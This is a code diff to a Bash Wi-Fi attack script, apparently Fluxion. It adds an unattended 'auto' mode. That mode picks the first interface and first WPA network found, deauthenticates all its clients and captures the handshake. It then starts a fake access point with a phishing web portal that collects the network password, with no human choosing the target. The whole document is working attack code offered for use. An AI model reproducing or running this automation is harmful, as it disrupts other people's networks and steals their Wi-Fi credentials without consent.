@@ -12,6 +12,12 @@ else KEEP_NETWORK=1
 fi
 ################################
 
+###### AUTO CONFIG SETUP #######
+if [ -z ${FLUX_AUTO+x} ]; then FLUX_AUTO=0
+else FLUX_AUTO=1
+fi
+################################
+
 if [[ $EUID -ne 0 ]]; then
         echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root.""\e[0m"""
         exit 1
@@ -30,7 +36,7 @@ HANDSHAKE_PATH="/root/handshakes"
 PASSLOG_PATH="/root/pwlog"
 WORK_DIR=`pwd`
 DEAUTHTIME="9999999999999"
-revision=123
+revision=124
 version=0.24
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -955,6 +961,11 @@ function language {
     iptables-save > $DUMP_PATH/iptables-rules
 	conditional_clear
 
+if [ "$FLUX_AUTO" =  "1" ];then 
+	german; setinterface
+
+else 
+
 	while true; do
 		conditional_clear
 		top
@@ -990,6 +1001,8 @@ function language {
 			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
 		  esac
 	done
+fi 
+
 }
 
 function german {
@@ -1557,10 +1570,17 @@ function setinterface {
 				wirelessifaces[$i]=$line
 				echo -e "      "$red"["$yellow"$i"$red"]"$transparent" $line"
 			done
-			echo
-			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-			read line
+
+			if [ "$FLUX_AUTO" = "1" ];then 
+				line="1"
+			else 	
+				echo
+				echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
+				read line
+			fi
+
 			PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
+			 
 		fi
 
 		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
@@ -1637,28 +1657,32 @@ function deltax {
 # Select channel
 function choosescan {
 
-	conditional_clear
+	
+	if [ "$FLUX_AUTO" = "1" ];then 
+		Scan
+	else 
+	 conditional_clear
+		while true; do
+			conditional_clear
+			top
 
-	while true; do
-		conditional_clear
-		top
-
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_choosescan"
-		echo "                                       "
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" $choosescan_option_1          "
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" $choosescan_option_2       "
-		echo -e "      "$red"["$yellow"3"$red"]"$red" $general_back       " $transparent
-		echo "                                       "
-		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-		read yn
-		echo ""
-		case $yn in
-			1 ) Scan ; break ;;
-			2 ) Scanchan ; break ;;
-			3 ) setinterface; break;;
-			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
-		  esac
-	done
+			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_choosescan"
+			echo "                                       "
+			echo -e "      "$red"["$yellow"1"$red"]"$transparent" $choosescan_option_1          "
+			echo -e "      "$red"["$yellow"2"$red"]"$transparent" $choosescan_option_2       "
+			echo -e "      "$red"["$yellow"3"$red"]"$red" $general_back       " $transparent
+			echo "                                       "
+			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
+			read yn
+			echo ""
+			case $yn in
+				1 ) Scan ; break ;;
+				2 ) Scanchan ; break ;;
+				3 ) setinterface; break;;
+				* ) echo "Unknown option. Please choose again"; conditional_clear ;;
+			  esac
+		done
+	fi 
 }
 
 # Choose your channel if you choose option 2 before
@@ -1688,7 +1712,12 @@ function Scan {
 
 	conditional_clear
 	rm -rf $DUMP_PATH/dump*
+
+	if [ "$FLUX_AUTO" = "1" ];then
+		sleep 30 && killall xterm &
+	fi 
 	xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one
+ 
 }
 
 # Choose a network
@@ -1756,15 +1785,21 @@ function selection {
 			aspeed[$i]=$SPEED
 		fi
 	done < $DUMP_PATH/dump-02.csv
-	echo
-	echo -e ""$blue "("$white"*"$blue") $selection_1"$transparent""
-	echo ""
-	echo -e "        $selection_2"
-	echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-	read choice
+		
+	# Select the first network if you select the first network 
+	if [ "$FLUX_AUTO" = "1" ];then 
+		choice=1
+	else
+		echo
+		echo -e ""$blue "("$white"*"$blue") $selection_1"$transparent""
+		echo ""
+		echo -e "        $selection_2"
+		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
+		read choice
+	fi 
 
 	if [[ $choice -eq "r" ]]; then
-	deltax
+		deltax
 	fi
 
 	idlength=${aidlength[$choice]}
@@ -1802,58 +1837,64 @@ function askAP {
 		askauth
 	fi
 
-	top
-	while true; do
+	if [ "$FLUX_AUTO" = "1" ];then 
+	  	fakeapmode="hostapd"; authmode="handshake"; handshakelocation
+	else 
+		top
+		while true; do
 
-		infoap
+			infoap
 
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_askAP"
-		echo "                                       "
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" $askAP_option_1"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askAP_option_2"
-		echo -e "      "$red"["$yellow"3"$red"]"$transparent" $askAP_option_4"
-		echo -e "      "$red"["$yellow"4"$red"]"$red" $general_back" $transparent""
-		echo "                                       "
-		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-		read yn
-		echo ""
-		case $yn in
-			1 ) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
-			2 ) fakeapmode="airbase-ng"; askauth; break ;;
-			3 ) fakeapmode="WPS-SLAUGHTER"; wps; break ;;
-			4 ) fakeapmode="Aircrack-ng"; Bruteforce; break;;
-			5 ) selection; break ;;
-			* ) echo "$general_case_error"; conditional_clear ;;
-		esac
-	done
-
+			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_askAP"
+			echo "                                       "
+			echo -e "      "$red"["$yellow"1"$red"]"$transparent" $askAP_option_1"
+			echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askAP_option_2"
+			echo -e "      "$red"["$yellow"3"$red"]"$transparent" $askAP_option_4"
+			echo -e "      "$red"["$yellow"4"$red"]"$red" $general_back" $transparent""
+			echo "                                       "
+			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
+			read yn
+			echo ""
+			case $yn in
+				1 ) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
+				2 ) fakeapmode="airbase-ng"; askauth; break ;;
+				3 ) fakeapmode="WPS-SLAUGHTER"; wps; break ;;
+				4 ) fakeapmode="Aircrack-ng"; Bruteforce; break;;
+				5 ) selection; break ;;
+				* ) echo "$general_case_error"; conditional_clear ;;
+			esac
+		done
+	fi 
 }
 
 # Test Passwords / airbase-ng
 function askauth {
 
-	conditional_clear
+	if [ "$FLUX_AUTO" = "1" ];then 
+		authmode="handshake"; handshakelocation
+	else 	
+		conditional_clear
 
-	top
-	while true; do
+		top
+		while true; do
 
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_askauth"
-		echo "                                       "
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" $askauth_option_1"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askauth_option_2"
-		echo -e "      "$red"["$yellow"3"$red"]"$transparent" $general_back"
-		echo "                                       "
-		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-		read yn
-		echo ""
-		case $yn in
-			1 ) authmode="handshake"; handshakelocation; break ;;
-			2 ) authmode="wpa_supplicant";  webinterface; break ;;
-			3 ) askAP; break ;;
-			* ) echo "$general_case_error"; conditional_clear ;;
-		esac
-	done
-
+			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_askauth"
+			echo "                                       "
+			echo -e "      "$red"["$yellow"1"$red"]"$transparent" $askauth_option_1"
+			echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askauth_option_2"
+			echo -e "      "$red"["$yellow"3"$red"]"$transparent" $general_back"
+			echo "                                       "
+			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
+			read yn
+			echo ""
+			case $yn in
+				1 ) authmode="handshake"; handshakelocation; break ;;
+				2 ) authmode="wpa_supplicant";  webinterface; break ;;
+				3 ) askAP; break ;;
+				* ) echo "$general_case_error"; conditional_clear ;;
+			esac
+		done
+	fi 
 }
 
 function handshakelocation {
@@ -1866,7 +1907,11 @@ function handshakelocation {
 		echo -e "Handshake $yellow$Host_SSID-$Host_MAC.cap$transparent found in /root/handshakes."
 		echo -e "${red}Do you want to use this file? (y/N)"
 		echo -ne "$transparent"
-		read usehandshakefile
+
+		if [ "$FLUX_AUTO" = "0" ];then 
+			read usehandshakefile
+		fi 
+
 		if [ "$usehandshakefile" = "y" -o "$usehandshakefile" = "Y" ]; then
 			handshakeloc="/root/handshakes/$Host_SSID2-$Host_MAC.cap"
 		fi
@@ -1878,8 +1923,12 @@ function handshakelocation {
 		echo
 		echo -n "Path: "
 		echo -ne "$red"
-		read handshakeloc
 		echo -ne "$transparent"
+	
+		if [ "$FLUX_AUTO" = "0" ];then 
+			read handshakeloc
+		fi 
+
 	fi
 		if [ "$handshakeloc" = "" ]; then
 			deauthforce
@@ -1948,28 +1997,34 @@ function handshakelocation {
 
 function deauthforce {
 
-	conditional_clear
 
-	top
-	while true; do
+	if [ "$FLUX_AUTO" = "1" ];then 
+		 handshakemode="normal"; askclientsel
+	else 
 
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_deauthforce"
-		echo "                                       "
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" $deauthforce_option_1"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" pyrit"
-		echo -e "      "$red"["$yellow"3"$red"]"$transparent" $general_back"
-		echo "                                       "
-		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-		read yn
-		echo ""
-		case $yn in
-			1 ) handshakemode="normal"; askclientsel; break ;;
-			2 ) handshakemode="hard"; askclientsel; break ;;
-			3 ) askauth; break ;;
-			* ) echo "
-$general_case_error"; conditional_clear ;;
-		esac
-	done
+		conditional_clear
+
+		top
+		while true; do
+
+			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_deauthforce"
+			echo "                                       "
+			echo -e "      "$red"["$yellow"1"$red"]"$transparent" $deauthforce_option_1"
+			echo -e "      "$red"["$yellow"2"$red"]"$transparent" pyrit"
+			echo -e "      "$red"["$yellow"3"$red"]"$transparent" $general_back"
+			echo "                                       "
+			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
+			read yn
+			echo ""
+			case $yn in
+				1 ) handshakemode="normal"; askclientsel; break ;;
+				2 ) handshakemode="hard"; askclientsel; break ;;
+				3 ) askauth; break ;;
+				* ) echo "
+		$general_case_error"; conditional_clear ;;
+			esac
+		done
+	fi 
 }
 
 ############################################### < MENU > ###############################################
@@ -1984,33 +2039,36 @@ $general_case_error"; conditional_clear ;;
 # Type of deauthentication to be performed
 function askclientsel {
 
-	conditional_clear
+	if [ "$FLUX_AUTO" = "1" ];then 
+		deauth all
+	else 
+		conditional_clear
 
-	while true; do
-		top
+		while true; do
+			top
 
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_deauthMENU"
-		echo "                                       "
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Deauth all"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Deauth all [mdk3]"
-		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Deauth target "
-		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Rescan networks "
-		echo -e "      "$red"["$yellow"5"$red"]"$transparent" Exit"
-		echo "                                       "
-		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
-		read yn
-		echo ""
-		case $yn in
-			1 ) deauth all; break ;;
-			2 ) deauth mdk3; break ;;
-			3 ) deauth esp; break ;;
-			4 ) killall airodump-ng &>$flux_output_device; deltax; break;;
-			5 ) exitmode; break ;;
-			* ) echo "
-$general_case_error"; conditional_clear ;;
-		esac
-	done
-
+			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_deauthMENU"
+			echo "                                       "
+			echo -e "      "$red"["$yellow"1"$red"]"$transparent" Deauth all"
+			echo -e "      "$red"["$yellow"2"$red"]"$transparent" Deauth all [mdk3]"
+			echo -e "      "$red"["$yellow"3"$red"]"$transparent" Deauth target "
+			echo -e "      "$red"["$yellow"4"$red"]"$transparent" Rescan networks "
+			echo -e "      "$red"["$yellow"5"$red"]"$transparent" Exit"
+			echo "                                       "
+			echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
+			read yn
+			echo ""
+			case $yn in
+				1 ) deauth all; break ;;
+				2 ) deauth mdk3; break ;;
+				3 ) deauth esp; break ;;
+				4 ) killall airodump-ng &>$flux_output_device; deltax; break;;
+				5 ) exitmode; break ;;
+				* ) echo "
+	$general_case_error"; conditional_clear ;;
+			esac
+		done
+	fi 
 }
 
 #
@@ -2062,33 +2120,40 @@ function deauth {
 
 function deauthMENU {
 
-	while true; do
-		conditional_clear
+	if [ "$FLUX_AUTO" = "1" ];then 
+		while true;do 
+			checkhandshake && sleep 5
+		done
+	else 
 
-		clear
-		top
+		while true; do
+			conditional_clear
 
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_deauthMENU "
-		echo
-		echo -e "Status handshake: $Handshake_statuscheck"
-		echo
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" $deauthMENU_option_1"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" $general_back (Select another deauth method)"
-		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Select another network"
-		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Exit"
-		echo -n '      #> '
-		read yn
+			clear
+			top
 
-		case $yn in
-			1 ) checkhandshake;;
-			2 ) conditional_clear; killall xterm; askclientsel; break;;
-			3 ) killall airodump-ng mdk3 aireplay-ng xterm &>$flux_output_device; CSVDB=dump-01.csv; breakmode=1; killall xterm; selection; break ;;
-			4 ) exitmode; break;;
-			* ) echo "
-$general_case_error"; conditional_clear ;;
-		esac
+			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_deauthMENU "
+			echo
+			echo -e "Status handshake: $Handshake_statuscheck"
+			echo
+			echo -e "      "$red"["$yellow"1"$red"]"$transparent" $deauthMENU_option_1"
+			echo -e "      "$red"["$yellow"2"$red"]"$transparent" $general_back (Select another deauth method)"
+			echo -e "      "$red"["$yellow"3"$red"]"$transparent" Select another network"
+			echo -e "      "$red"["$yellow"4"$red"]"$transparent" Exit"
+			echo -n '      #> '
+			read yn
 
-	done
+			case $yn in
+				1 ) checkhandshake;;
+				2 ) conditional_clear; killall xterm; askclientsel; break;;
+				3 ) killall airodump-ng mdk3 aireplay-ng xterm &>$flux_output_device; CSVDB=dump-01.csv; breakmode=1; killall xterm; selection; break ;;
+				4 ) exitmode; break;;
+				* ) echo "
+	$general_case_error"; conditional_clear ;;
+			esac
+
+		done
+	fi 
 }
 
 # Capture all
@@ -2098,7 +2163,7 @@ function capture {
 	if ! ps -A | grep -q airodump-ng; then
 
 		rm -rf $DUMP_PATH/$Host_MAC*
-		xterm $HOLD -title "Capturing data on channel --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
+		xterm $HOLD -title "Capturing data on channel --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng  --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR --ignore-negative-one &
 	fi
 }
 
@@ -2143,59 +2208,67 @@ function checkhandshake {
 
 ############################################# < HANDSHAKE > ############################################
 
-# function for ssl
 function certssl {
+
 # Test if the ssl certificate is generated correcly if there is any
-
-		if [ -f $DUMP_PATH/server.pem ]; then
+ 
+	if [ -f $DUMP_PATH/server.pem ]; then
 		if [ -s $DUMP_PATH/server.pem ]; then
+			webinterface
+			break
+		else
 
-		webinterface
-		break
+			if [ "$FLUX_AUTO" = "1" ];then 
+				creassl
+			fi
+			while true;do 
+			conditional_clear
+			top
+			echo "                                       "
+			echo -e ""$red"["$yellow"i"$red"]"$transparent" Certificate invalid or not present, please choose an option"
+			echo "                                       "
+			echo -e "      "$red"["$yellow"1"$red"]"$transparent" Create a SSL certificate"
+			echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSL certificate" # hop to certssl check again
+			echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
+			echo " "
+			echo -n '      #> '
+			read yn
+
+			case $yn in
+				1 ) creassl;;
+				2 ) certssl;break;;
+				3 ) exitmode; break;;
+				* ) echo "$general_case_error"; conditional_clear
+			esac
+			done 
+		 fi
 	else
-		conditional_clear
-		top
-		echo "                                       "
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" Certificate invalid or not present, please choose an option"
-		echo "                                       "
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Create a SSL certificate"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSL certificate" # hop to certssl check again
-		echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
-		echo " "
-		echo -n '      #> '
-		read yn
+			if [ "$FLUX_AUTO" = "1" ];then 
+				creassl
+			fi
 
-		case $yn in
-			1 ) creassl;;
-			2 ) certssl;break;;
-			3 ) exitmode; break;;
-			* ) echo "$general_case_error"; conditional_clear
-		esac
-		fi
-	else
-		while true; do
-		conditional_clear
-		top
-		echo "                                    	                            "
-		echo "  Certificate invalid or not present, please choice"
-		echo "                                       "
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Create  a SSL certificate"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSl certificate" # hop to certssl check again
-		echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
-		echo " "
-		echo -n '      #> '
-		read yn
+			while true; do
+			conditional_clear
+			top
+			echo "                                    	                            "
+			echo "  Certificate invalid or not present, please choice"
+			echo "                                       "
+			echo -e "      "$red"["$yellow"1"$red"]"$transparent" Create  a SSL certificate"
+			echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSl certificate" # hop to certssl check again
+			echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
+			echo " "
+			echo -n '      #> '
+			read yn
 
-		case $yn in
-			1 ) creassl;;
-			2 ) certssl; break;;
-			3 ) exitmode; break;;
-			* ) echo "$general_case_error"; conditional_clear
-		esac
-
-	done
-
-	fi
+			case $yn in
+				1 ) creassl;;
+				2 ) certssl; break;;
+				3 ) exitmode; break;;
+				* ) echo "$general_case_error"; conditional_clear
+			esac
+		done
+	fi 
+	
 
 
 }
@@ -2214,35 +2287,44 @@ function webinterface {
 
 	chmod 400 /root/server.pem
 
-	while true; do
-		conditional_clear
-		top
+	if [ "$FLUX_AUTO" = "1" ];then 
+		matartodo; ConnectionRESET; selection
+	else 
+		while true; do
+			conditional_clear
+			top
 
-		infoap
-		echo
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_webinterface"
-		echo
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Web Interface"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Bruteforce"
-		echo -e "      "$red"["$yellow"3"$red"]"$transparent" \e[1;31mExit"$transparent""
-		echo
-		echo -n "#? "
-		read yn
-		case $yn in
-		1 ) matartodo; ConnectionRESET; selection; break;;
-		2 ) matartodo; Bruteforce2; break;;
-		3 ) matartodo; exitmode; break;;
-		esac
-	done
+			infoap
+			echo
+			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_webinterface"
+			echo
+			echo -e "      "$red"["$yellow"1"$red"]"$transparent" Web Interface"
+			echo -e "      "$red"["$yellow"2"$red"]"$transparent" Bruteforce"
+			echo -e "      "$red"["$yellow"3"$red"]"$transparent" \e[1;31mExit"$transparent""
+			echo
+			echo -n "#? "
+			read yn
+			case $yn in
+			1 ) matartodo; ConnectionRESET; selection; break;;
+			2 ) matartodo; Bruteforce2; break;;
+			3 ) matartodo; exitmode; break;;
+			esac
+		done
+	fi 
 }
 
 function ConnectionRESET {
 
+	if [ "$FLUX_AUTO" = "1" ];then 
+		webconf=1
+	else 	
 		while true; do
 			conditional_clear
 			top
+
 			infoap
 			n=1
+			
 			echo
 			echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_ConnectionRESET"
 			echo
@@ -2288,9 +2370,9 @@ function ConnectionRESET {
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
 			echo
 			echo -n "#? "
-			read fluxass
-
-			if [ "$fluxass" = "1" ]; then
+			read webconf
+	 
+			if [ "$webconf" = "1" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
@@ -2304,7 +2386,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-			elif [ "$fluxass" = "2" ]; then
+			elif [ "$webconf" = "2" ]; then
 		        	DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_GER
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_GER
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_GER
@@ -2318,7 +2400,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-            		elif [ "$fluxass" = "3" ]; then
+            		elif [ "$webconf" = "3" ]; then
    				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_RUS
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_RUS
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_RUS
@@ -2332,7 +2414,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-			elif [ "$fluxass" = "4" ]; then
+			elif [ "$webconf" = "4" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
@@ -2346,7 +2428,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-			elif [ "$fluxass" = "5" ]; then
+			elif [ "$webconf" = "5" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
@@ -2360,7 +2442,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-			elif [ "$fluxass" = "6" ]; then
+			elif [ "$webconf" = "6" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
@@ -2374,7 +2456,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-			elif [ "$fluxass" = "7" ]; then
+			elif [ "$webconf" = "7" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_CN
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_CN
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_CN
@@ -2388,7 +2470,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-			elif [ "$fluxass" = "8" ]; then
+			elif [ "$webconf" = "8" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
@@ -2402,7 +2484,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-			elif [ "$fluxass" = "9" ]; then
+			elif [ "$webconf" = "9" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_TR
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_TR
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_TR
@@ -2416,7 +2498,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-			elif [ "$fluxass" = "10" ]; then
+			elif [ "$webconf" = "10" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_RO
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_RO
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_RO
@@ -2430,7 +2512,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-			elif [ "$fluxass" = "11" ]; then
+			elif [ "$webconf" = "11" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_HU
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_HU
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_HU
@@ -2444,7 +2526,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-			elif [ "$fluxass" = "12" ]; then
+			elif [ "$webconf" = "12" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ARA
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ARA
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ARA
@@ -2458,7 +2540,7 @@ function ConnectionRESET {
 				NEUTRA
 				break
 
-      			elif [ "$fluxass" = "13" ]; then
+      			elif [ "$webconf" = "13" ]; then
         			DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_GR
      			        DIALOG_WEB_INFO=$DIALOG_WEB_INFO_GR
       				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_GR
@@ -2472,7 +2554,7 @@ function ConnectionRESET {
         			NEUTRA
         			break
 
-			elif [ "$fluxass" = "14" ]; then
+			elif [ "$webconf" = "14" ]; then
         			DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_CZ
       				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_CZ
         			DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_CZ
@@ -2486,7 +2568,7 @@ function ConnectionRESET {
         			NEUTRA
         			break
 
-			elif [ "$fluxass" = "15" ]; then
+			elif [ "$webconf" = "15" ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_NO
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_NO
                                 DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_NO
@@ -2500,7 +2582,7 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
-			elif [ "$fluxass" = "16" ]; then
+			elif [ "$webconf" = "16" ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_BG
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_BG
                                 DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_BG
@@ -2514,7 +2596,7 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 				
-              		elif [ "$fluxass" = "17" ]; then
+              		elif [ "$webconf" = "17" ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_SRB
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_SRB
                                 DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_SRB
@@ -2528,7 +2610,7 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
-			elif [ "$fluxass" = "18" ]; then
+			elif [ "$webconf" = "18" ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_PL
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_PL
                                 DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_PL
@@ -2542,7 +2624,7 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
-			elif [ "$fluxass" = "19" ]; then
+			elif [ "$webconf" = "19" ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ID
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ID
                                 DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ID
@@ -2556,7 +2638,7 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
-			elif [ "$fluxass" = "20" ]; then
+			elif [ "$webconf" = "20" ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_NL
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_NL
                                 DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_NL
@@ -2570,7 +2652,7 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 			
-			elif [ "$fluxass" = 21 ]; then
+			elif [ "$webconf" = 21 ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_DAN
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_DAN
                                 DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_DAN
@@ -2584,7 +2666,7 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
-    			elif [ "$fluxass" = 22 ]; then
+    			elif [ "$webconf" = 22 ]; then
